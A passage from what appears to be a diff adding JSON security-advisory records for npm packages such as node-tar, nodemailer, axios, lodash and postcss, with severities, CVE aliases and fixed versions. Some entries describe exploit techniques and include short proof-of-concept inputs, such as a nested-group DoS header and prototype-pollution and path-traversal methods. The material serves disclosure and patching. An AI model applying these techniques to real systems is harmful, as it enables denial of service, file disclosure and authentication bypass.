}\nContains </style>: true\n```\n\n## Impact\n\nImpact non-bundler use cases since bundlers for XSS on their own. Requires some PostCSS plugin to have malware code, which can inject XSS to website.\n",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-41305"
+  ],
+  "published": "2026-04-24T15:31:42Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-41305",
+  "fixed": [
+   "postcss@8.5.10"
+  ]
+ },
+ {
+  "id": "GHSA-r28c-9q8g-f849",
+  "summary": "PostCSS: Path Traversal in Previous Source Map Auto-Loading (sourceMappingURL) leads to Arbitrary .map File Disclosure",
+  "details": "## Vulnerability Details\n\n**File**: `lib/previous-map.js`\n**Line**: 87-98 (`loadFile`), 129-144 (`loadMap`)\n\n\n### Root Cause\nPostCSS auto-detects a `/*# sourceMappingURL=... */` comment inside the CSS text it is asked to parse and, unless the caller explicitly passes `map: false`, attempts to load that path from disk as a \"previous source map.\" This happens on every `postcss.parse()` / `postcss().process()` call by default (opt-out, not opt-in).\n\n`loadMap()` builds the candidate path via `join(dirname(opts.from), annotation)`, where `annotation` is the raw, attacker-controlled string from the CSS comment. `path.join()` normalizes but does not sandbox `..` segments, so a `../../../` prefix walks the resolved path outside the intended directory. If `opts.from` is not set at all, the annotation is used completely unmodified — an absolute path in the CSS comment is read verbatim.\n\n8.5.12 already fixed a strictly worse variant of this (any file, any extension, could be read) by requiring the resolved path to end in `.map` (`loadFile()`). That fix did not address the traversal itself, only the target extension. Since the `join(dirname(file), map)` logic has existed unchanged since PostCS",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-73646"
+  ],
+  "published": "2026-07-24T16:24:55Z",
+  "url": "https://osv.dev/vulnerability/GHSA-r28c-9q8g-f849",
+  "fixed": [
+   "postcss@8.5.18"
+  ]
+ },
+ {
+  "id": "GHSA-r292-9mhp-454m",
+  "summary": "node-tar: Uncontrolled recursion in mapHas/filesFilter allows uncatchable stack-overflow DoS via crafted long-path tar with member selection",
+  "details": "## Summary\n`node-tar` (npm `tar`) contains an uncontrolled-recursion stack-exhaustion DoS in the internal `mapHas` helper used by `filesFilter`. When a consumer calls `tar.t(...)` or `tar.x(...)` with a non-empty member-selection list, node-tar installs a filter that closes over the recursive `mapHas` (`src/list.ts:33-44`). `mapHas` walks an entry path upward one `path.dirname()` call per recursion **with no segment cap**. A single crafted tar with a GNU-`L` (or PAX-`x`) long-path header can deliver a path of tens of thousands of `/`-separated segments (up to `maxMetaEntrySize` = 1 MiB). The recursion overflows the call stack, throwing an uncatchable `RangeError` that terminates the Node process on async/streaming consumers.\n\n## Root Cause\n`filesFilter` (`src/list.ts:27-51`) is installed whenever a caller passes a member-selection list (`src/list.ts:119-122`, `src/extract.ts:55-57`). Its filter is invoked at `src/parse.ts:253` (`entry.ignore = entry.ignore || !this.filter(entry.path, entry)`) inside `Parser[CONSUMEHEADER]` — and crucially **outside** the only try/catch in that method (which wraps `new Header` at `src/parse.ts:179-183`). `mapHas` recurses once per path segment with ",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-73566"
+  ],
+  "published": "2026-07-24T16:26:16Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73566",
+  "fixed": [
+   "tar@7.5.21"
+  ]
+ },
+ {
+  "id": "GHSA-r5fr-rjxr-66jc",
+  "summary": "lodash vulnerable to Code Injection via `_.template` imports key names",
+  "details": "### Impact\n\nThe fix for [CVE-2021-23337](https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the `variable` option in `_.template` but did not apply the same validation to `options.imports` key names. Both paths flow into the same `Function()` constructor sink.\n\nWhen an application passes untrusted input as `options.imports` key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.\n\nAdditionally, `_.template` uses `assignInWith` to merge imports, which enumerates inherited properties via `for..in`. If `Object.prototype` has been polluted by any other vector, the polluted keys are copied into the imports object and passed to `Function()`.\n\n### Patches\n\nUsers should upgrade to version 4.18.0.\n\nThe fix applies two changes:\n1. Validate `importsKeys` against the existing `reForbiddenIdentifierChars` regex (same check already used for the `variable` option)\n2. Replace `assignInWith` with `assignWith` when merging imports, so only own properties are enumerated\n\n### Workarounds\n\nDo not pass untrusted input as key names in `options.imports`. Only use developer-controlled, static key names.",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-4800"
+  ],
+  "published": "2026-04-01T23:51:12Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-4800",
+  "fixed": [
+   "lodash@4.18.0",
+   "lodash-es@4.18.0",
+   "lodash-amd@4.18.0",
+   "lodash.template@4.18.0"
+  ]
+ },
+ {
+  "id": "GHSA-r628-mhmh-qjhw",
+  "summary": "Arbitrary File Creation/Overwrite via insufficient symlink protection due to directory cache poisoning",
+  "details": "### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\n`node-tar` aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks.  Additionally, in order to prevent unnecessary `stat` calls to determine whether a given path is a directory, paths are cached when directories are created.\n\nThis logic was insufficient when extracting tar files that contained both a directory and a symlink with the same name as the directory. This order of operations resulted in the directory being created and added to the `node-tar` directory cache. When a directory is present in the directory cache, subsequent calls to mkdir for that directory are skipped. However, this is also where `node-tar` checks for symlinks occur.\n\nBy first creating a directory, and then replacing that directory with a symlink, it was thus possible to bypass `node-tar` symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file crea",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2021-32803"
+  ],
+  "published": "2021-08-03T19:00:40Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32803",
+  "fixed": [
+   "tar@3.2.3",
+   "tar@4.4.15",
+   "tar@5.0.7",
+   "tar@6.1.2"
+  ]
+ },
+ {
+  "id": "GHSA-r683-j2x4-v87g",
+  "summary": "node-fetch forwards secure headers to untrusted sites",
+  "details": "node-fetch forwards secure headers such as `authorization`, `www-authenticate`, `cookie`, & `cookie2` when redirecting to a untrusted site.",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2022-0235"
+  ],
+  "published": "2022-01-21T23:55:52Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-0235",
+  "fixed": [
+   "node-fetch@3.1.1",
+   "node-fetch@2.6.7"
+  ]
+ },
+ {
+  "id": "GHSA-r6q2-hw4h-h46w",
+  "summary": "Race Condition in node-tar Path Reservations via Unicode Ligature Collisions on macOS APFS",
+  "details": "**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS\n\n**AUTHOR**: Tomás Illuminati\n\n### Details\n\nA race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.\n\n```typescript\n// node-tar/src/path-reservations.ts (Lines 53-62)\nreserve(paths: string[], fn: Handler) {\n    paths =\n      isWindows ?\n        ['win32 parallelization disabled']\n      : paths.map(p => {\n          return stripTrailingSlashes(\n            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS\n          ).toLowerCase()\n     ",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-23950"
+  ],
+  "published": "2026-01-21T01:05:49Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-23950",
+  "fixed": [
+   "tar@7.5.4"
+  ]
+ },
+ {
+  "id": "GHSA-r7g4-qg5f-qqm2",
+  "summary": "Nodemailer: Improper TLS Certificate Validation in OAuth2 Token Fetch Enables Credential Interception",
+  "details": "### Summary\nNodemailer disables TLS certificate verification in its internal HTTPS fetch client through the use of rejectUnauthorized: false inside lib/fetch/index.js.\n\nAs a result, OAuth2 token requests trust invalid or self-signed HTTPS certificates and transmit sensitive OAuth credentials over connections that should fail TLS validation.\n\nAn attacker in a machine-in-the-middle position can intercept OAuth2 credential exchanges and capture:\n\n- OAuth client_secret\n- refresh_token\n- access tokens\n\nThe issue was verified through runtime testing using a self-signed HTTPS OAuth endpoint.\n\n### Details\nRoot Cause\n\nThe issue originates from the internal HTTPS fetch implementation used by Nodemailer for OAuth2 token retrieval and related outbound HTTPS requests.\n\nInside:\n\n`lib/fetch/index.js`\n\nthe request options contain:\n\n`rejectUnauthorized: false`\n\nThis disables TLS peer certificate verification globally for the internal HTTPS client unless explicitly overridden through optional TLS configuration.\n\nAs a result:\n\n- self-signed certificates are trusted\n- invalid CA chains are accepted\n- hostname validation is bypassed\n- attacker-controlled HTTPS endpoints are treated as trusted\n\nThis vio",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-82662"
+  ],
+  "published": "2026-06-15T17:34:48Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-82662",
+  "fixed": [
+   "nodemailer@8.0.8"
+  ]
+ },
+ {
+  "id": "GHSA-rcmh-qjqh-p98v",
+  "summary": "Nodemailer’s addressparser is vulnerable to DoS caused by recursive calls",
+  "details": "### Summary\nA DoS can occur that immediately halts the system due to the use of an unsafe function.\n\n### Details\nAccording to **RFC 5322**, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list.\nHowever, the code implemented for this flattening process can be exploited by malicious input and triggers DoS\n\nRFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group.\nAt the following location in lib/addressparser/index.js:\n\nhttps://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90\n\nthere is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header:\n\n```g0: g1: g2: g3: ... gN: victim@example.com;```\n\nBecause no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern\n`addressparser → ",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2025-14874"
+  ],
+  "published": "2025-12-01T20:44:25Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-14874",
+  "fixed": [
+   "nodemailer@7.0.11"
+  ]
+ },
+ {
+  "id": "GHSA-rhx6-c78j-4q9w",
+  "summary": "path-to-regexp contains a ReDoS",
+  "details": "### Impact\n\nThe regular expression that is vulnerable to backtracking can be generated in versions before 0.1.12 of `path-to-regexp`, originally reported in CVE-2024-45296\n\n### Patches\n\nUpgrade to 0.1.12.\n\n### Workarounds\n\nAvoid using two parameters within a single path segment, when the separator is not `.` (e.g. no `/:a-:b`). Alternatively, you can define the regex used for both parameters and ensure they do not overlap to allow backtracking.\n\n### References\n\n- https://github.com/advisories/GHSA-9wv6-86v2-598j\n- https://blakeembrey.com/posts/2024-09-web-redos/",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2024-52798"
+  ],
+  "published": "2024-12-05T22:40:47Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-52798",
+  "fixed": [
+   "path-to-regexp@0.1.12"
+  ]
+ },
+ {
+  "id": "GHSA-rv95-896h-c2vc",
+  "summary": "Express.js Open Redirect in malformed URLs",
+  "details": "### Impact\n\nVersions of Express.js prior to 4.19.2 and pre-release alpha and beta versions before 5.0.0-beta.3 are affected by an open redirect vulnerability using malformed URLs.\n\nWhen a user of Express performs a redirect using a user-provided URL Express performs an encode [using `encodeurl`](https://github.com/pillarjs/encodeurl) on the contents before passing it to the `location` header. This can cause malformed URLs to be evaluated in unexpected ways by common redirect allow list implementations in Express applications, leading to an Open Redirect via bypass of a properly implemented allow list.\n\nThe main method impacted is `res.location()` but this is also called from within `res.redirect()`.\n\n### Patches\n\nhttps://github.com/expressjs/express/commit/0867302ddbde0e9463d0564fea5861feb708c2dd\nhttps://github.com/expressjs/express/commit/0b746953c4bd8e377123527db11f9cd866e39f94\n\nAn initial fix went out with `express@4.19.0`, we then patched a feature regression in `4.19.1` and added improved handling for the bypass in `4.19.2`.\n\n### Workarounds\n\nThe fix for this involves pre-parsing the url string with either `require('node:url').parse` or `new URL`. These are steps you can take ",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2024-29041"
+  ],
+  "published": "2024-03-25T19:40:26Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-29041",
+  "fixed": [
+   "express@4.19.2",
+   "express@5.0.0-beta.3"
+  ]
+ },
+ {
+  "id": "GHSA-v422-hmwv-36x6",
+  "summary": "body-parser vulnerable to denial of service when invalid limit value silently disables size enforcement",
+  "details": "### Impact\n\nWhen body-parser is configured with an invalid `limit` option value, such as an unparseable string or `NaN`, `bytes.parse()` returns `null` and the request body size check is silently skipped. Applications that rely on `limit` as their primary safeguard against oversized request bodies will accept arbitrarily large payloads, leading to excessive memory and CPU usage and denial of service.\n\nThis issue affects applications that pass a programmatically computed or user-configurable value to the `limit` option without validating it first.\n\n### Patches\n\nThis issue is fixed in [body-parser@2.3.0](https://github.com/expressjs/body-parser/releases/tag/v2.3.0) and [body-parser@1.20.6](https://github.com/expressjs/body-parser/releases/tag/v1.20.6) via [#698](https://github.com/expressjs/body-parser/pull/698). After the fix, invalid `limit` values throw a clear error at parser construction time instead of silently disabling enforcement. `null` and `undefined` continue to fall back to the default limit (`100kb`).\n\n### Workarounds\n\nValidate `limit` before passing it to body-parser. For example, parse the value with [`bytes.parse()`](https://github.com/visionmedia/bytes.js) at startu",
+  "severity": "LOW",
+  "aliases": [
+   "CVE-2026-12590"
+  ],
+  "published": "2026-07-20T23:23:26Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-12590",
+  "fixed": [
+   "body-parser@1.20.6",
+   "body-parser@2.3.0"
+  ]
+ },
+ {
+  "id": "GHSA-v53p-9fqp-m79j",
+  "summary": "Nodemailer: Quadratic backtracking in the addressparser free-text fallback allows remote denial of service",
+  "details": "### Summary\n\nWhen `addressparser` finds no address by its strict reading, it falls back to pulling one out of the free text with `/\\s*\\b[^@\\s]+@[^\\s]+\\b\\s*/`. That pattern backtracks quadratically: `[^@\\s]+` is retried from every offset and rescans the run to the next `@` each time. A single header value holding a long whitespace-free run with no usable `@` blocks the Node.js event loop for tens of seconds.\n\nIt is cheaper to exploit than GHSA-prgh-xp8r-p3m5: 273KB is enough for ~43s, where the comment-joined shape needed ~1.5MB for ~10s.\n\n### Details\n\nThe fallback in `src/addressparser/index.ts` ran the pattern as a search. `[^@\\s]+` crosses neither whitespace nor `@`, so from each start offset it scans forward to the next `@` or to the end of the run and then fails, and the engine simply advances one character and repeats. Three shapes make every offset fail:\n\n- the run holds no `@` at all\n- the only `@` has nothing after it\n- the only `@` has nothing before it\n\nA fourth reaches it with a valid address present but placed past a long run, so the long run is walked before the match is found.\n\n### PoC\n\n```js\nconst addressparser = require('nodemailer/lib/addressparser');\nconst s = Dat",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-100700"
+  ],
+  "published": "2026-09-29T23:43:36Z",
+  "url": "https://osv.dev/vulnerability/GHSA-v53p-9fqp-m79j",
+  "fixed": [
+   "nodemailer@10.0.6"
+  ]
+ },
+ {
+  "id": "GHSA-v923-w3x8-wh69",
+  "summary": "Passport vulnerable to session regeneration when a users logs in or out",
+  "details": "This affects the package passport before 0.6.0. When a user logs in or logs out, the session is regenerated instead of being closed.",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2022-25896"
+  ],
+  "published": "2022-07-02T00:00:19Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25896",
+  "fixed": [
+   "passport@0.6.0"
+  ]
+ },
+ {
+  "id": "GHSA-vcc3-ghjq-m6fr",
+  "summary": "decode-uri-component: Denial of service via exponential decoding of malformed percent-encoded input",
+  "details": "### Impact\nAn attacker who can supply input to `decodeUriComponent()` (directly or via a dependency that uses this package on URL/query/path data) can cause excessive CPU usage and application unresponsiveness. This is an availability issue; there is no known memory corruption, data disclosure, or remote code execution impact.\n\n### Patches\nUpgrade to `decode-uri-component@0.5.0`.\n\n### Workarounds\nLimit the size of the input.",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-45822"
+  ],
+  "published": "2026-08-31T22:10:20Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-45822",
+  "fixed": [
+   "decode-uri-component@0.5.0"
+  ]
+ },
+ {
+  "id": "GHSA-vf2m-468p-8v99",
+  "summary": "Axios: HTTP adapter streamed responses bypass maxContentLength",
+  "details": "### Summary\n\nWhen responseType: 'stream' is used, Axios returns the response stream without enforcing maxContentLength. This bypasses configured response-size limits and allows unbounded downstream consumption.\n\n### Details\nIn lib/adapters/http.js:\n  - 786-789: for responseType === 'stream', Axios immediately settles with the stream.\n  - 797-810: maxContentLength enforcement exists only in the non-stream buffering branch.\n\nSo callers may set maxContentLength and still receive/read arbitrarily large streamed responses.\n\n### PoC\n\nEnvironment:\n- Axios main at commit f7a4ee2\n- Node v24.2.0\n\n Steps:\n\n1. Start an HTTP server that returns a 2 MiB response body.\n2. Call Axios with:\n   - adapter: 'http'\n   - responseType: 'stream'\n   - maxContentLength: 1024\n3. Read the returned stream fully.\n\nObserved:\n- Success; full 2097152 bytes readable.\n\nControl check:\n- Same endpoint with responseType: 'text' and same maxContentLength: rejected with maxContentLength size of 1024 exceeded.\n\n### Impact\nType: DoS / unbounded response processing.\nImpacted: Node.js applications relying on maxContentLength as a safety boundary while using streamed Axios responses.",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-42036"
+  ],
+  "published": "2026-05-05T00:26:57Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-42036",
+  "fixed": [
+   "axios@1.15.1",
+   "axios@0.31.1"
+  ]
+ },
+ {
+  "id": "GHSA-vfj7-8cjw-p6xm",
+  "summary": "braces vulnerable to stack-exhaustion denial of service through deeply nested patterns",
+  "details": "braces through 3.0.3 contains a stack overflow vulnerability in the recursive AST walkers that lack depth guards. Attackers can supply deeply nested brace patterns under the character limit to exhaust the call stack and terminate the Node.js process with an uncaught RangeError.",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-93687"
+  ],
+  "published": "2026-09-18T18:31:41Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-93687",
+  "fixed": []
+ },
+ {
+  "id": "GHSA-vmf3-w455-68vh",
+  "summary": "node-tar applies PAX size override to intermediary GNU long-name/long-link headers, causing tar parser interpretation differential (file smuggling)",
+  "details": "### Summary\n\n`tar` (node-tar) applies a PAX extended header's `size=` record (and other PAX\noverrides) to the **next header entry of any type**, including intermediary\nmetadata headers such as a GNU long-name (`L`) or long-link (`K`) entry. Per\nPOSIX pax, a PAX extended header (`x`) describes the *next file entry*, not the\nintermediary extension headers that may sit between the `x` header and the file\nit annotates. Because node-tar lets the PAX `size` override the byte length of\nan intervening `L`/`K`/`x` header, an attacker can desynchronize node-tar's\nstream cursor relative to every other mainstream tar implementation\n(GNU tar, libarchive/bsdtar, Python `tarfile`, and the now-fixed `tar-rs` /\n`astral-tokio-tar`).\n\nThe result is a tar parser **interpretation differential** (CWE-436): a single\ncrafted archive yields a different set of members under node-tar than under the\nreference tar tools. An attacker can use this to hide a member from one parser\nwhile it is visible to another, which defeats security tooling whose scanner and\nextractor disagree on archive contents (e.g. a malware/secret scanner that lists\nentries with one library while a downstream step extracts with another). n",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-53655"
+  ],
+  "published": "2026-06-15T17:19:42Z",
+  "url": "https://osv.dev/vulnerability/GHSA-vmf3-w455-68vh",
+  "fixed": [
+   "tar@7.5.16"
+  ]
+ },
+ {
+  "id": "GHSA-vvjj-xcjg-gr5g",
+  "summary": "Nodemailer Vulnerable to SMTP Command Injection via CRLF in Transport name Option (EHLO/HELO) ",
+  "details": "### Summary\n\nNodemailer versions up to and including 8.0.4 are vulnerable to SMTP command injection via CRLF sequences in the transport `name` configuration option. The `name` value is used directly in the EHLO/HELO SMTP command without any sanitization for carriage return and line feed characters (`\\r\\n`). An attacker who can influence this option can inject arbitrary SMTP commands, enabling unauthorized email sending, email spoofing, and phishing attacks.\n\n### Details\n\nThe vulnerability exists in `lib/smtp-connection/index.js`. When establishing an SMTP connection, the `name` option is concatenated directly into the EHLO command:\n\n```javascript\n// lib/smtp-connection/index.js, line 71\nthis.name = this.options.name || this._getHostname();\n\n// line 1336\nthis._sendCommand('EHLO ' + this.name);\n```\n\nThe `_sendCommand` method writes the string directly to the socket followed by `\\r\\n` (line 1082):\n\n```javascript\nthis._socket.write(Buffer.from(str + '\\r\\n', 'utf-8'));\n```\n\nIf the `name` option contains `\\r\\n` sequences, each injected line is interpreted by the SMTP server as a separate command. Unlike the `envelope.from` and `envelope.to` fields which are validated for `\\r\\n` (line 110",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-82853"
+  ],
+  "published": "2026-04-08T15:05:20Z",
+  "url": "https://osv.dev/vulnerability/GHSA-vvjj-xcjg-gr5g",
+  "fixed": [
+   "nodemailer@8.0.5"
+  ]
+ },
+ {
+  "id": "GHSA-w5hq-g745-h8pq",
+  "summary": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+  "details": "### Summary\n\nThe `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4()',()=>v4({},new Uint8Array(8),4)],\n  ['v5()',()=>v5('x',ns,new Uint8Array(8),4)],\n  ['v6()',()=>v6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4() THREW RangeError`\n- `v5() NO_THROW`\n- `v6() NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```t",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-41907",
+   "CVE-2026-41988"
+  ],
+  "published": "2026-04-22T20:53:24Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-41907",
+  "fixed": [
+   "uuid@11.1.1",
+   "uuid@12.0.1",
+   "uuid@13.0.1"
+  ]
+ },
+ {
+  "id": "GHSA-w7fw-mjwx-w883",
+  "summary": "qs's arrayLimit bypass in comma parsing allows denial of service",
+  "details": "### Summary\nThe `arrayLimit` option in qs does not enforce limits for comma-separated values when `comma: true` is enabled, allowing attackers to cause denial-of-service via memory exhaustion. This is a bypass of the array limit enforcement, similar to the bracket notation bypass addressed in GHSA-6rw7-vpxm-498p (CVE-2025-15284).\n\n### Details\nWhen the `comma` option is set to `true` (not the default, but configurable in applications), qs allows parsing comma-separated strings as arrays (e.g., `?param=a,b,c` becomes `['a', 'b', 'c']`). However, the limit check for `arrayLimit` (default: 20) and the optional throwOnLimitExceeded occur after the comma-handling logic in `parseArrayValue`, enabling a bypass. This permits creation of arbitrarily large arrays from a single parameter, leading to excessive memory allocation.\n\n**Vulnerable code** (lib/parse.js: lines ~40-50):\n```js\nif (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {\n    return val.split(',');\n}\n\nif (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n    throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : '",
+  "severity": "LOW",
+  "aliases": [
+   "CVE-2026-2391"
+  ],
+  "published": "2026-02-12T17:04:39Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-2391",
+  "fixed": [
+   "qs@6.14.2"
+  ]
+ },
+ {
+  "id": "GHSA-w7rc-rwvf-8q5r",
+  "summary": "The `size` option isn't honored after following a redirect in node-fetch",
+  "details": "### Impact\nNode Fetch did not honor the `size` option after following a redirect, which means that when a content size was over the limit, a `FetchError` would never get thrown and the process would end without failure.\n\nFor most people, this fix will have a little or no impact. However, if you are relying on node-fetch to gate files above a size, the impact could be significant, for example: If you don't double-check the size of the data after `fetch()` has completed, your JS thread could get tied up doing work on a large file (DoS) and/or cost you money in computing.\n\n### Patches\nWe released patched versions for both stable and beta channels:\n\n- For `v2`: 2.6.1\n- For `v3`: 3.0.0-beta.9\n\n### Workarounds\nNone, it is strongly recommended to update as soon as possible.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [node-fetch](https://github.com/node-fetch/node-fetch/issues/new?assignees=&labels=question&template=support-or-usage.md&title=Question%3A+)\n* Contact one of the core maintainers.",
+  "severity": "LOW",
+  "aliases": [
+   "CVE-2020-15168"
+  ],
+  "published": "2020-09-10T17:46:21Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15168",
+  "fixed": [
+   "node-fetch@2.6.1",
+   "node-fetch@3.0.0-beta.9"
+  ]
+ },
+ {
+  "id": "GHSA-w8wr-v893-vjvp",
+  "summary": "node-tar: Process crash via PAX numeric path type confusion",
+  "details": "### Summary\n\nA crafted 2.5KB tar archive crashes any Node.js process that extracts it. The PAX header parser coerces all-digit path values to JavaScript numbers, which causes an uncaught TypeError when downstream code calls `.split('/')` on the numeric value. Error handlers and `strict: false` cannot intercept the crash.\n\n### Details\n\nIn `pax.ts` line 180, `parseKV` converts PAX values matching `/^[0-9]+$/` to numbers via `+v`. This applies to all fields including `path` and `linkpath`. When a PAX header sets `path` to an all-digit string like `\"12345\"`, the value becomes the number `12345`.\n\nThis number flows through Header -> ReadEntry -> Unpack.CHECKPATH, where `normalizeWindowsPath(entry.path).split('/')` throws a TypeError because numbers don't have `.split()`.\n\nThe throw is synchronous during event emission and bypasses all error handling:\n- `strict: false` does not help\n- `'error'` event handlers do not catch it\n- `'warn'` handlers do not catch it\n- The TypeError propagates through the event emitter stack as an uncaughtException\n\nDirectory, SymbolicLink, and Link type entries reach CHECKPATH and crash. File type entries crash earlier in Header constructor at `this.path.slice",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-59871"
+  ],
+  "published": "2026-07-20T21:53:14Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59871",
+  "fixed": [
+   "tar@7.5.18"
+  ]
+ },
+ {
+  "id": "GHSA-w9j2-pvgh-6h63",
+  "summary": "Axios: Authentication Bypass via Prototype Pollution Gadget in `validateStatus` Merge Strategy",
+  "details": "# Vulnerability Disclosure: Authentication Bypass via Prototype Pollution Gadget in `validateStatus` Merge Strategy\n\n## Summary\n\nThe Axios library is vulnerable to a Prototype Pollution \"Gadget\" attack that allows any `Object.prototype` pollution to **silently suppress all HTTP error responses** (401, 403, 500, etc.), causing them to be treated as successful responses. This completely bypasses application-level authentication and error handling.\n\nThe root cause is that `validateStatus` is the **only** config property using the `mergeDirectKeys` merge strategy, which uses JavaScript's `in` operator — an operator that inherently traverses the prototype chain. When `Object.prototype.validateStatus` is polluted with `() => true`, all HTTP status codes are accepted as success.\n\n**Severity:** High (CVSS 8.2)\n**Affected Versions:** All versions (v0.x - v1.x including v1.15.0)\n**Vulnerable Component:** `lib/core/mergeConfig.js` (`mergeDirectKeys` strategy) + `lib/core/settle.js`\n\n## CWE\n\n- **CWE-1321:** Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')\n- **CWE-287:** Improper Authentication\n\n## CVSS 3.1\n\n**Score: 8.2 (High)**\n\nVector: `CVSS:3.1/AV:N/",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-42041"
+  ],
+  "published": "2026-05-05T00:21:39Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-42041",
+  "fixed": [
+   "axios@1.15.1",
+   "axios@0.31.1"
+  ]
+ },
+ {
+  "id": "GHSA-wc69-rhjr-hc9g",
+  "summary": "Moment.js vulnerable to Inefficient Regular Expression Complexity",
+  "details": "### Impact\n\n* using string-to-date parsing in moment (more specifically rfc2822 parsing, which is tried by default) has quadratic (N^2) complexity on specific inputs\n* noticeable slowdown is observed with inputs above 10k characters\n* users who pass user-provided strings without sanity length checks to moment constructor are vulnerable to (Re)DoS attacks\n\n### Patches\nThe problem is patched in 2.29.4, the patch can be applied to all affected versions with minimal tweaking.\n\n### Workarounds\nIn general, given the proliferation of ReDoS attacks, it makes sense to limit the length of the user input to something sane, like 200 characters or less. I haven't seen legitimate cases of date-time strings longer than that, so all moment users who do pass a user-originating string to constructor are encouraged to apply such a rudimentary filter, that would help with this but also most future ReDoS vulnerabilities.\n\n### References\nThere is an excellent writeup of the issue here: https://github.com/moment/moment/pull/6015#issuecomment-1152961973=\n\n### Details\nThe issue is rooted in the code that removes legacy comments (stuff inside parenthesis) from strings during rfc2822 parsing. `moment(\"(\".rep",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2022-31129"
+  ],
+  "published": "2022-07-06T18:38:49Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31129",
+  "fixed": [
+   "moment@2.29.4",
+   "Moment.js@2.29.4"
